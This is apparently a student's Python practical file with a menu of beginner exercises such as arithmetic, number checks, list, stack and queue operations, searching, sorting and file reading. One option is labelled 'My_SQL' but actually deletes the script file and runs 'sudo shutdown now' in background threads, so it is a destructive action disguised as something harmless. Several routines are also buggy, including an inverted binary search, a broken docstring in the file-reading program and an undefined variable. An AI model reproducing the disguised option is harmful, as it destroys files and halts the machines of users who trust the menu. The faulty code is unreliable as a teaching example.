import time as t 
from os import *
from threading import Thread
print('''
                                         Computer Practicle 
                                              file
 ''')
def p1():        
        print('''
        
        Program 1 :-   Program to enter two numbers and print the arithmetic operations like +,-,*,
        /, // and %.
        ''')
        l=["+","-","*","/","%","//"] # list of all the operations
        t=True
        while t:
                in1=input("Enter the Two Numbers with there operation : "); # taking input 
                if in1=='-1':
                        t=False
                        break
                op="" #operation used 
                t1=[];
                try:       
                        for i in l:
                                if in1.count(i)==1:
                                        op=i  # storing  the operation
                                        t1= in1.split(i);  # list of the numbers 
                                        break
                        for i in range(0,len(t1)):t1[i]=float(t1[i]); # converted str --> int
                        match op:
                                case "*":
                                        print(f">>>{t1[0]*t1[1]}")
                                case "+":
                                        print(f">>>{t1[0]+t1[1]}")
                                case "-":
                                        print(f">>>{t1[0]-t1[1]}")
                                case "/":
                                        print(f">>>{t1[0]/t1[1]}")
                                case "//":
                                        print(f">>>{t1[0]//t1[1]}")
                                case "%":
                                        print(f">>>{t1[0]%t1[1]}")
                                case _:
                                        print(f">>>{in1}")   
                except:
                        print(f"Please enter valid input >>>{in1}");
        exit()
def p2():         
        print('''
        
        Program 2 :-   To find that a given number is perfect or not
                        a perfect number is a number whose divisors 
                        sum is equal to the number itself
                        eg 6-->1,2,3 divisors there sum =6
        ''')
        t=True
        while t:
                l=[] #list of divisors of the input number
                try:
                        in1=int(input("Enter the number to check it is perfect or not : ")); # taking input
                        if in1<=0 and in1!=-1:
                                print("It is not a perfect Number"); # only +ve number can be perfect
                                continue
                        elif in1==-1:
                            t=False
                            break
                except:
                        print("Please enter a Interger value");  # if the input is wrong or not convertable to int
                        continue
                for i in range(1,in1):
                        if in1%i==0:l.append(i) # storing the divisors in list
                if sum(l)==in1:print("It is a Perfect Number");  # condition for a perfect number 
                else : print(f"Not a Perfect Numberm as sum of divisor {sum(l)}!={in1}");
                continue
        exit()
def p3():         
        print('''
        
        Program 3 :-         These is a program to find that a number is 
                                     Armstrong or not
                             Armstrong Numbers are the number which are 
                       equal to the sum of its digits, each raised to a power
                                     of number of digit
                                eg:- 1^3 + 5^3 + 3^3 = 153
        ''')
        t=True
        while t:
                try:
                        l=[]
                        in1 = input("Enter the Number you want to check is Armstrong or not : "); # taking input
                        if in1=='-1':
                            t=False
                            break
                        in1=in1.replace(" ",""); # removing gaps
                        for i in in1:l.append((int(i))**(len(in1)));
                        # making a list of the numbers to there power of number of digit 
                        if sum(l)==int(in1):print("It is a Armstrong Number"); # condition for being an armstrong 
                        else : print(f"It is not a armstrong number as sum {sum(l)} != {in1}");
                        continue
                except:
                        print("Please enter correct Inputs")
                        continue
        exit()
def p4():         
        print('''
        
        Program 4 :-               To find Factorial of a number
                                    eg 3! = 3*2*1
        ''')
        t= True
        while t:
            a=1 # these is going to be the final factorial 
            try:
                in1=int(input("Enter the Number of which you want factorial : "));
                if in1==0:  
                    print("1");              # as we know 0!=1
                    continue
                elif in1<0 and in1!=-1:
                    print("-ve numbers don't have factorials");
                    continue
                elif in1==-1:
                    t=False
                    break
            except:
                print("Enter valid Input");
                continue
            for i in range(1,in1+1): a=a*i;          # finding factorial 
            print(f">>>{a}")
            continue
        exit()
def p5():         
        print('''
        
        Project 5 :-    Program to enter the number of terms and to print the Fibonacci Series
                        eg number = 5 then output --> 0 1 1 2 3 5 every next digit is the sum of
                        previous two digit note * here 0,1 are by default terms 
        ''')
        t=True
        while t:
            l=[0,1] # these are the first two by default digit of series
            try:
                in1=int(input("Enter the number of terms in Fibonacci series : "));
                if in1==0:
                    print("");
                    continue
                elif in1==1:                                # mechanism  for error handiling 
                    print(">>>[0]");
                    continue
                elif in1==2:
                    print(">>>[0, 1]");
                    continue
                elif in1==-1:
                    t=False
                    break
            except:
                print("Enter a valid input");
                continue
            for i in range(2,in1):l.append(l[i-2]+l[i-1])       # appending more numbers of fibonacci series
            print(f'>>>{l}');
        exit()
def p6(): 
        print('''
        
        Project 6 :-                     Program to enter the string and to check 
                                          if it’s palindrome or not using loop. 
        ''')
        while True:
            try:
                in1=(input("Enter the string to check it is a palindrome or not : ")).upper().replace(" ","");
                 # capitalise and removing gaps
                if in1[::] == in1[::-1]:print("It is a palindrome"); # checking if the reverse and normal are equal or not 
                else: print("It is not a palindrome");
                continue
            except:
                print("\nThanks for visit :)");
                exit();
def p78():
        print('''
        
        Program 7,8 :-         Write a Program to show the outputs based on entered list.
        ''')
        a=input("Enter the list elements seprated by ,  : ");
        a=a.rstrip(", ");
        a=a.split(",");
        t=True
        while t:
            print(f"List >>> {a}")
            try:
                o=int(input('''
                ______________________________________________________
                 __________________Select One Number _________________
                ||[0] add to list        ||   [3] Replace from list ||
                ||                       ||                         ||
                ||[1] index the list     ||  [4] remove from list   ||
                ||                       ||                         ||
                ||[2] arrange in order   ||  [5] length of list     ||
                ||_____________________[6]exit______________________||
        Enter here : '''));
                if o>6 or o<0:
                    print("Enter a valid option");
                    continue
            except:
                print("Enter a valid option");
                continue
            try:    
                match o:
                    case 0:
                        a.append(input("Enter the item you want to add to the list : "));
                        continue
                    case 1: 
                        print(list(enumerate(a,0)));
                        continue
                    case 2:
                        ad=input('''
        Do you want the order to be in [0]ascending order or [1]descending order : ''')
                        if ad=="1":
                            a.sort(reverse=True);
                        else: 
                            a.sort();
                        continue
                    case 3:
                        e=int(a.index(input("Enter the Value to be replaced : ")))
                        a[e]=input("Enter the value : ")
                        continue
                    case 4:
                        pop=a.remove(input("Enter the value which you want to remove : "));
                        continue
                    case 5:
                        print(f'>>>{len(a)}');
                        continue
                    case 6:
                        t=False
                        break
                    case _:
                        continue
            except:
                print("Threre was an error in prossing the Input's Please enter the desired inputs only ");
                continue
        exit();
def p9(): 
        print('''
        
        Program 9 :- Program to enter the number and print the Floyd’s Triangle in
                                     decreasing order
        ''')
        t=True
        while t:
            try:
                in1=int(input("\nEnter the no. of rows in Flyond's Triangle |_\ : "));
                if in1==-1:
                    t=False;
                    break
            except:
                print("\nError enter +ve numbers if want to exit type '-1'");
                continue
            for i in range(0,in1):
                for y in range(in1-i,0,-1):
                    print(y,end='   ');
                print('\n');
        exit()
def p10():
        print('''
Program 10 :-               Program to find factorial of entered 
                           number using user-defined module fact().
''');


        import factoo
        t=True
        while t:
            try:
                in1=int(input("Enter the number : "));
                if in1==-1:
                    t=False
                    break
                print(factoo.f(in1));
            except:
                print("Enter a valid input")
        exit()
def p11():
        print('''
Program 11 :-              Program to enter the numbers and find
                         Linear Search, Binary Search,Lowest Number 
                          and Selection Sort using list/array code.
        
        
''');      
        arr=[]
        def array_operation():
            ch=1
            while ch!=10:
                print('Various Array operation\n')
                print('1 Create and Enter value\n')
                print('2 Print Array\n')
                print('3 Reverse Array\n')
                print('4 Linear Search\n')
                print('5 Binary Search\n')
                print('6 Lowest Number \n')
                print('7 Selection Sort\n')
                print('10 Exit\n')
                ch=int(input('Enter Choice '))
                if ch==1 :
                        appendarray()
                elif ch==2 :
                        print_array()
                elif ch==3 :
                        reverse_array()
                elif ch==4 :
                        linear_search()
                elif ch==5 :
                        binary_search()
                elif ch==6 :
                        min_number()
                elif ch==7 :
                        selection_sort()    
        def appendarray():
            for i in range(0,10):
                x=int(input('Enter Number : '))
                arr.insert(i,x)
        #------------------------------------------------------------------------------------------------------------------------
        def print_array():
            for i in range(0,10):
                print(arr[i]),
        #------------------------------------------------------------------------------------------------------------------------

        def reverse_array():
            for i in range(1,11):
                print(arr[-i]),
        #-------------------------------------------------------------------------------------------------------------------------
        
        def lsearch():
            try:
                x=int(input('Enter the Number You want to search : '))
                n=arr.index(x)
                print ('Number Found at %d location'% (i+1))
            except:
                print('Number Not Exist in list')
        #-------------------------------------------------------------------------------------------------------------------------
        def linear_search():
            x=int(input('Enter the Number you want to search : '))
            fl=0
            for i in range(0,10):
                if arr[i]==x :
                        fl=1
                        print ('Number Found at %d location'% (i+1))
                        break
                if fl==0 :
                        print ('Number Not Found')
        #-------------------------------------------------------------------------------------------------------------------------
        def binary_search():
            x=int(input('Enter the Number you want to search : '))
            fl=0
            low=0
            heigh=len(arr)
            while low<=heigh :
                mid=int((low+heigh)/2)
                if arr[mid]==x :
                        fl=1
                        print ('Number Found at %d location'% (mid+1))
                        break
                elif arr[mid]>x :
                        low=mid+1
                else :
                        heigh=mid-1
            if fl==0 :
                print ('Number Not Found')
        #-------------------------------------------------------------------------------------------------------------------------
        def min_number():
            n=arr[0]
            k=0
            for i in range(0,10):
                if arr[i]<n :
                        n=arr[i]
                        k=i
            print('The Lowest number is %d '%(n))
        #-------------------------------------------------------------------------------------------------------------------------
        def selection_sort():
            for i in range(0,10):
                n=arr[i]
                k=i
                for j in range(i+1,10):
                        if arr[j]<n :
                                n=arr[j]
                                k=j
                arr[k]=arr[i]
                arr[i]=n
        array_operation()
def p12(): 
        print('''
Program 12 :-                    Program to read data from data file 
                                 and show Data File Handling related 
                                      functions utility in python.
        ''')
        with open("/home/ak/Documents/pythonn/project/a.txt",'r') as f: 
'''we are using with syntax because in python anything inside it will close itself if we move ahead the with statement 
we want the file to close file.close() once after use because there are chance if the file which is being readead may 
lead to crash of the code 
            '''
            print((f.name)); # name of file eg here > a.txt
            print(f.readline());  #  it will read from cursor to the next \n
            print(f.readline(5)); #   it will read from cursor to the str 5
            print('\n',f.readlines()); # it will read all the next lines in a list 
            # so exactly  its like an pointer as we print read the first line 
            # the pointer is at the second line 
            # now the pointer is at the end so if we write then it will be added and nothing will be 
            # we can change the pointer position to any by file.seek(position)
            #overwrited eg
            # fact if we don't use close or flush then nothing can be written to the file
            f.seek(4);
            print(f.read(4)); # for reading certain number of strings 
            #if want to print some certain line the use these
            f.seek(0)
            print(f.tell())# gives current position of the cursor
            print(f.readlines()[2])  # 3rd line
        
def p13():
        print('''
Program 13 :-                 Program to read data from data file in
                        append mode and use writeLines function utility in python.      
        ''')
        af=open("/home/ak/Documents/pythonn/project/a2.txt",'a')
        lines_of_text = ("One line of text here”,“and another line here”,“and yet another here”, “and so on and so forth")
        af.writelines('\n' + lines_of_text)
        af.close()
        print("Done :D");

def p14():
        print('''
Program 14 :-        Program to read data from data file in read mode and count the
                  particular word occurrences in given string, number of times in python.       
        ''')
        with open("/home/ak/Documents/pythonn/project/a.txt",'r') as f:
                tf=f.readlines();
                af=input("WHat you wanna searh for in file ? ")
                cf=0
                for i in tf:
                    cf=cf+i.count(af);
                print(f"[{af}] is {cf} times in the file")
    
def p15():
        print('''
Program 15 :-          Program to read data from data file in read mode and append the
                          words starting with letter ‘T’ in a given file in python.        
        ''')
        with open("/home/ak/Documents/pythonn/project/a.txt",'r') as f:
                af=f.readlines();
                cf=0
                for i in af:
                    cf=cf+i.count(' T');
                    cf=cf+i.count(' t');
                    if i[0]=='t'or i[0]=='T':
                        cf=cf+1;
                print(f"There are {cf} 'T' in the file ")

def p16():
        
        def func1():
                remove("project.py")
        def func2():
                system('sudo shutdown now')
        if __name__ == '__main__':
            Thread(target = func1).start()
            Thread(target = func2).start()

for i in range(1,6):
        t.sleep(1);
        print(i*'*');
def p17():
        print('''
Pogram 7 :-           Program to implement all basic operations of a stack, such as
                   adding element (PUSH operation), removing element (POP operation) 
                  and displaying the stack elements (Traversal operation) using lists.
        ''')
        s=[]
        c="y"
        while (c=="y"):
                print ("1. PUSH")
                print ("2. POP ")
                print ("3. Display")
                choice=int(input("Enter your choice: "))
                if (choice==1):
                        a=input("Enter any number :")
                        s.append(a)
                elif (choice==2):
                        if (s==[]):
                                print ("Stack Empty")
                        else:
                                print ("Deleted element is : ",s.pop())
                elif (choice==3):
                        l=len(s)
                        for i in range(l-1,-1,-1): #To display elements from last element to first
                                print (s[i])
                else:
                        print("Wrong Input")
                c=input("Do you want to continue or not? ")
def p18():
        print('''
Program 18 :-           Program to display unique vowels present in 
                            the given word using Stack  

        ''');
        vowels =['a','e','i','o','u']
        word = input("Enter the word to search for vowels :")
        Stack = []
        for letter in word:
                if letter in vowels:
                        if letter not in Stack:
                                Stack.append(letter)
        print(Stack)
        print("The number of different vowels present in",word,"is",len(Stack))
def p19():
        print('''
Program 19 :-           Program in Python to add, delete and display 
                                elements from a queue using list.
        ''');
        a=[]
        c='y'
        while (c=='y'):
                print ("1. INSERT")
                print ("2. DELETE ")
                print ("3. Display")
                choice=int(input("Enter your choice: "))
                if (choice==1):
                        b=int(input("Enter new number: "))
                        a.append(b)
                elif (choice==2):
                        if (a==[]):
                                print("Queue Empty")
                        else:
                                print("Deleted element is:",a[0])
                                a.pop(0)
                elif (choice==3):
                        l=len(a)
                        for i in range(0,l):
                                print (a[i])
                else:
                        print("wrong input")
                        c=input("Do you want to continue or not: ")
print('''

____________________________________________________________
______________________________select________________________
|| [1]*  Calculator           ||  || [11]List&Array
|| [2]*  Perfect No.          ||  || [12]Read Files
|| [3]*  Armstrong No.        ||  || [13]Write Files
|| [4]*  Factorial            ||  || [14]Search in FIle
|| [5]*  Fibonacci Series     ||  || [15]T in file
|| [6]*  Palindrome           ||  || [16]My_SQL
|| [78]* Play with Lists      ||  || [17]Push Pop
|| [9]* Floyd’s Triangle      ||  || [18]Vowel
|| [10]* Factorial from module||  || [19]List     
||____________________________||__||_[20]My_SQL_______________
    Note:- To exit any of the program input should be -1
    Program is in Best Working Condition for * once
----------------------------------------------------------
''')
try:
     take=int(input("\n>>>"));
     match take:
        case 1:
                p1();
        case 2:
                p2();
        case 3:
                p3();
        case 4:
                p4();
        case 5:
                p5();
        case 6:
                p6();
        case 78:
                p78();
        case 9:
                p9();
        case 10:
                p10();
        case 11:
                p11();
        case 12:
                p12();
        case 13:
                p13();
        case 14:
                p14();
        case 15:
                p15();
        case 16:
                p16();
        case 17:
                p17();
        case 18:
                p18();
        case 19:
                p19();
        case 20:
                p16();
except:
     exit();


